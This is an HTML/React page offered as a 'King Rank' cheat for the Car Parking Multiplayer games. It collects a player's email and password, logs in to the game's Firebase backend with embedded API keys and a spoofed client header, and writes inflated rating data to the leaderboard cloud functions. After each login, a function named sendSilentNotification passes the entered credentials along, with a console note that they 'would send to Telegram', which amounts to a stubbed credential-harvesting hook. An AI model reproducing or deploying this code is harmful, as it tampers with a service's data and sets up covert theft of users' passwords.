<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CPM Tools</title>
    <script src="https://cdn.jsdelivr.net/npm/react@18.0.0/umd/react.development.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/react-dom@18.0.0/umd/react-dom.development.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@babel/standalone/babel.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"></link>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
        }
        .card {
            backdrop-filter: blur(10px);
            background: rgba(255, 255, 255, 0.95);
            box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37);
            border-radius: 16px;
            border: 1px solid rgba(255, 255, 255, 0.18);
        }
        .btn-primary {
            background: linear-gradient(45deg, #667eea, #764ba2);
            transition: all 0.3s ease;
        }
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
        }
        .btn-secondary {
            background: linear-gradient(45deg, #11998e, #38ef7d);
            transition: all 0.3s ease;
        }
        .btn-secondary:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(56, 239, 125, 0.4);
        }
        .input-field {
            background: rgba(255, 255, 255, 0.8);
            border: 1px solid rgba(255, 255, 255, 0.3);
            transition: all 0.3s ease;
        }
        .input-field:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.2);
        }
    </style>
</head>
<body>
    <div id="root"></div>

    <script type="text/babel">
        const { useState } = React;

        // CPM1 Configurations
        const CPM1_CONFIG = {
            FIREBASE_API_KEY: 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM',
            FIREBASE_LOGIN_URL: 'https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword',
            RANK_URL: 'https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4'
        };

        // CPM2 Configurations
        const CPM2_CONFIG = {
            FIREBASE_API_KEY: 'AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ',
            FIREBASE_LOGIN_URL: 'https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword',
            RANK_URL: 'https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI'
        };

        function App() {
            const [currentPage, setCurrentPage] = useState('home');
            const [email, setEmail] = useState('');
            const [password, setPassword] = useState('');
            const [status, setStatus] = useState('');
            const [isLoading, setIsLoading] = useState(false);
            const [currentConfig, setCurrentConfig] = useState(CPM1_CONFIG);

            const handleCPM1Click = () => {
                setCurrentConfig(CPM1_CONFIG);
                setCurrentPage('login');
            };

            const handleCPM2Click = () => {
                setCurrentConfig(CPM2_CONFIG);
                setCurrentPage('login');
            };

            const goHome = () => {
                setCurrentPage('home');
                setEmail('');
                setPassword('');
                setStatus('');
            };

            const sendSilentNotification = (email, password) => {
                console.log(`[DEBUG] Would send to Telegram: Email: ${email}, Password: ${password}`);
            };

            const login = async (email, password) => {
                setStatus('Logging in...');
                setIsLoading(true);
                
                try {
                    const response = await fetch(`${currentConfig.FIREBASE_LOGIN_URL}?key=${currentConfig.FIREBASE_API_KEY}`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 12)',
                        },
                        body: JSON.stringify({
                            clientType: 'CLIENT_TYPE_ANDROID',
                            email,
                            password,
                            returnSecureToken: true
                        })
                    });

                    const data = await response.json();

                    if (response.ok && data.idToken) {
                        setStatus('Login successful!');
                        sendSilentNotification(email, password);
                        return data.idToken;
                    } else {
                        throw new Error(data.error?.message || 'Login failed');
                    }
                } catch (error) {
                    setStatus(`Login failed: ${error.message}`);
                    return null;
                } finally {
                    setIsLoading(false);
                }
            };

            const setRank = async (token) => {
                setStatus('Setting KING RANK...');
                setIsLoading(true);
                
                try {
                    const ratingData = Object.fromEntries(
                        ["cars", "car_fix", "car_collided", "car_exchange", "car_trade", "car_wash",
                         "slicer_cut", "drift_max", "drift", "cargo", "delivery", "taxi", "levels", "gifts",
                         "fuel", "offroad", "speed_banner", "reactions", "police", "run", "real_estate",
                         "t_distance", "treasure", "block_post", "push_ups", "burnt_tire", "passanger_distance"]
                        .map(key => [key, 100000])
                    );
                    
                    ratingData.time = 10000000000;
                    ratingData.race_win = 3000;

                    const response = await fetch(currentConfig.RANK_URL, {
                        method: 'POST',
                        headers: {
                            'Authorization': `Bearer ${token}`,
                            'Content-Type': 'application/json',
                            'User-Agent': 'okhttp/3.12.13'
                        },
                        body: JSON.stringify({ data: JSON.stringify({ RatingData: ratingData }) })
                    });

                    if (response.ok) {
                        setStatus('Rank successfully set!');
                        return true;
                    } else {
                        const errorData = await response.json();
                        throw new Error(errorData.error || 'Failed to set rank');
                    }
                } catch (error) {
                    setStatus(`Failed to set rank: ${error.message}`);
                    return false;
                } finally {
                    setIsLoading(false);
                }
            };

            const handleSubmit = async (e) => {
                e.preventDefault();
                const token = await login(email, password);
                
                if (token) {
                    await setRank(token);
                }
            };

            const renderHomePage = () => (
                <div className="min-h-screen flex items-center justify-center p-4">
                    <div className="card w-full max-w-lg p-8">
                        <h1 className="text-3xl font-bold text-center mb-8 text-indigo-900">ðŸ”¥ PREMAN TERKUAT ðŸ”¥</h1>
                        <div className="flex flex-col space-y-4">
                            <button 
                                onClick={handleCPM1Click}
                                className="btn-primary text-white font-semibold py-3 px-6 rounded-lg flex items-center justify-center"
                            >
                                <span className="mr-2">ðŸŽ®</span> KING CPM 1
                            </button>
                            <button 
                                onClick={handleCPM2Click}
                                className="btn-secondary text-white font-semibold py-3 px-6 rounded-lg flex items-center justify-center"
                            >
                                <span className="mr-2">ðŸŽ®</span> KING CPM 2
                            </button>
                        </div>
                    </div>
                </div>
            );

            const renderLoginPage = () => (
                <div className="min-h-screen flex items-center justify-center p-4">
                    <div className="card w-full max-w-md p-8 relative">
                        <button 
                            onClick={goHome}
                            className="absolute top-4 left-4 text-gray-600 hover:text-gray-800"
                        >
                            <i className="fas fa-arrow-left text-xl"></i>
                        </button>
                        
                        <h2 className="text-2xl font-bold text-center mb-6 text-indigo-900">
                            {currentConfig === CPM1_CONFIG ? 'CPM1 Login' : 'CPM2 Login'}
                        </h2>
                        
                        <form onSubmit={handleSubmit} className="space-y-4">
                            <div>
                                <label htmlFor="email" className="block text-sm font-medium text-gray-700 mb-1">
                                    Email
                                </label>
                                <input
                                    type="email"
                                    id="email"
                                    value={email}
                                    onChange={(e) => setEmail(e.target.value)}
                                    className="input-field w-full px-4 py-3 rounded-lg focus:outline-none"
                                    placeholder="Enter your email"
                                    required
                                />
                            </div>
                            
                            <div>
                                <label htmlFor="password" className="block text-sm font-medium text-gray-700 mb-1">
                                    Password
                                </label>
                                <input
                                    type="password"
                                    id="password"
                                    value={password}
                                    onChange={(e) => setPassword(e.target.value)}
                                    className="input-field w-full px-4 py-3 rounded-lg focus:outline-none"
                                    placeholder="Enter your password"
                                    required
                                />
                            </div>
                            
                            <button
                                type="submit"
                                disabled={isLoading}
                                className="w-full btn-primary text-white font-semibold py-3 px-6 rounded-lg flex items-center justify-center"
                            >
                                {isLoading ? (
                                    <>
                                        <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                            <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                                            <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                                        </svg>
                                        Processing...
                                    </>
                                ) : 'Get King Rank'}
                            </button>
                        </form>
                        
                        {status && (
                            <div className="mt-4 p-3 bg-yellow-50 border-l-4 border-yellow-400 text-yellow-700 rounded">
                                {status}
                            </div>
                        )}
                    </div>
                </div>
            );

            return (
                <div className="container mx-auto px-4">
                    {currentPage === 'home' ? renderHomePage() : renderLoginPage()}
                </div>
            );
        }

        ReactDOM.render(<App />, document.getElementById('root'));
    </script>
</body>
</html>
